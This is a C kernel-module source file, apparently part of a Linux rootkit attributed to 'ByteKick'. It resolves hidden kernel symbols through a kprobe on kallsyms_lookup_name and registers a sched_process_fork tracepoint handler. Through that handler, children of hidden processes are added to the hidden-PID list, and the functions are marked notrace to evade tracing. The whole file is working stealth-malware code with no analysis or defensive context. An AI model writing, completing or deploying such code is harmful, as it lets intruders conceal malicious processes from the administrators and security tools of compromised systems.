#include "../include/core.h"
#include "../include/trace.h"
#include "../include/hidden_pids.h"

static struct tracepoint *tp_sched_fork;
static int (*_probe_register)(struct tracepoint *, void *, void *);
static int (*_probe_unregister)(struct tracepoint *, void *, void *);

static struct kprobe kp = {
	.symbol_name = "kallsyms_lookup_name"
};

static unsigned long (*_kallsyms_lookup_name)(const char *name);

static void on_fork_handler(void *data, struct task_struct *parent, struct task_struct *child)
{
    if (is_hidden_pid(parent->pid) || is_child_pid(parent->pid))
	add_child_pid(child->pid);
}
static void *get_symbol(const char *name)
{
    if (!_kallsyms_lookup_name) {
        register_kprobe(&kp);
        _kallsyms_lookup_name = (void *)kp.addr;
        unregister_kprobe(&kp);
    }
    return (void *)_kallsyms_lookup_name(name);
}

notrace int trace_pid_init(void)
{
    _probe_register = get_symbol("tracepoint_probe_register");
    _probe_unregister = get_symbol("tracepoint_probe_unregister");
    tp_sched_fork = get_symbol("__tracepoint_sched_process_fork");

    if (tp_sched_fork && _probe_register)
        _probe_register(tp_sched_fork, on_fork_handler, NULL);
    else
        return -ENODEV;

    return 0;
}
EXPORT_SYMBOL(trace_pid_init);

notrace void trace_pid_cleanup(void)
{
    if (tp_sched_fork && _probe_unregister)
        _probe_unregister(tp_sched_fork, on_fork_handler, NULL);
}
EXPORT_SYMBOL(trace_pid_cleanup);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("ByteKick");
